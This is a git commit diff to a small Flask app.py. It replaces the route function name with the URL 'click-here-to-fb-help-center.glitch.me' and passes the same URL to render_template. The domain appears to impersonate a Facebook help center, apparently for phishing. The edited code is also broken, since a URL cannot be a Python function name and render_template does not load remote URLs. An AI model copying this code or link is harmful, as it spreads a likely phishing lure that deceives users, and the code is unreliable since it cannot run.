2aa648eda60ca0014d58b82cc02eb8918988ec32
req-noewq <166973820+req-noewq@users.noreply.github.com>
2024-04-22 02:31:16 -0700

    Update app.py

--- app.py
+++ app.py
@@ -3,7 +3,7 @@ from flask import Flask, render_template
 app = Flask(__name__)
 
 @app.route('/')
-def redirect_page():
+def https://click-here-to-fb-help-center.glitch.me/():
     return render_template('https://click-here-to-fb-help-center.glitch.me/')
 
 if __name__ == '__main__':
